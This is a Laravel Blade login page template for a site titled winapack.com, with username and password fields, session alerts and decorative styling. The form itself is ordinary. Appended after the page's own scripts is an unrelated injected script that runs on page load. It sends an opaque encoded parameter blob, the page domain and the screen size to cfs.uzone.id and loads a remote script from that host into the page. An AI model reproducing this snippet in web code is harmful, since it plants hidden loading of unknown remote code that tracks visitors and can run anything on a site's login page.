<!DOCTYPE html>
<html >
<head>
  <meta charset="UTF-8">
  <title>winapack.com</title>
  
  
  
      <link rel="stylesheet" href="login/css/style.css">
      <link rel="stylesheet" type="text/css" href="{{ URL::asset('/css.css') }}">
	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.6/semantic.min.css">
  
</head>

<body>
  <div class="wrapper">
	<div class="container">
	<br>
	<br>
	<br>
	<br>

	  			
				
	
		<h1 style="color: white;">Welcome</h1>
		
		<div class="isi" style="margin-left: -370px;margin-top: -100px">
	<div class="form-login">
		<form class="login"  action="{{URL('dash')}}" method="POST">

		{{csrf_field()}}
			<div class="login-item">
				<center><span class="judullogin">
					
				</span></center>	
			</div>
			<div class="login-item">
			@if(Session::has('alertUsername'))
				<div class="alert">
				  <span class="closebtn">&times;</span>  
				     <span>{{ Session::get('alertUsername') }}</span>
				</div>
				@endif
				<div class="ui fluid left icon input">
						  <input type="text" name="username" placeholder="Username">
						  <i class="user icon"></i>
						</div>
						</div>
		    <div class="login-item">
		    @if(Session::has('alertPassword'))
		    	<div class="alert">
				  <span class="closebtn">&times;</span>  
				  	<span>{{ Session::get('alertPassword') }}</span>
				  	<?Session::forget('alertPassword') ;?>
				</div>
				@endif
				<div class="ui fluid left icon input">
						  <input type="password" name="password" placeholder="Password" >
						  <i class="lock icon"></i>
						</div>
		    </div>
		    <div class="login-item">
		    	<button class="fluid inverted ui silver button" style="height: 50px;">Login</button>
		    </div>
  		</form>
	</div>
	</div>
	</div>
	
	<ul class="bg-bubbles">
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
		<li></li>
	</ul>
</div>
  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

    <script  src="js/index.js"></script>

    <script>
var close = document.getElementsByClassName("closebtn");
var i;

for (i = 0; i < close.length; i++) {
    close[i].onclick = function(){
        var div = this.parentElement;
        div.style.opacity = "0";
        setTimeout(function(){ div.style.display = "none"; }, 600);
    }
}
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2Bjw%2bjvmqL3WSUrnnA9180Qh7l5ub%2b6gKdeKDVrP0uqpCOyvMajPCftijUdV%2fKOyC56iSeJuQbNERn03ueP6akmiCN0FwUWY9hdgYb%2bexWEj8bGL9MVUSgA%2fwn8DUSoLmJIO2bmQtbBBXJVTirf383vYTCoOZjwnjzBiNM8dZUjrn5LWWc%2f6gNAHdYD7TsZ4J11bszVMoppkIlRzE0jDKF%2fiB%2fa6e4A1%2fIwE6JZ%2fE%2frkIglagugD6Qdek3JrBkMUB1UN9F4AYKQv4BPQovkaz3LAzqOfACZ9DHahl6GXZyjJC%2ftKc2%2fLepJrIgUwbuZBmpEOIoUyeXkfOZHM90wiSGLYi%2bXTcM17Z%2bXK%2fY0boanVr0YxFMgI8okA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

</body>
</html>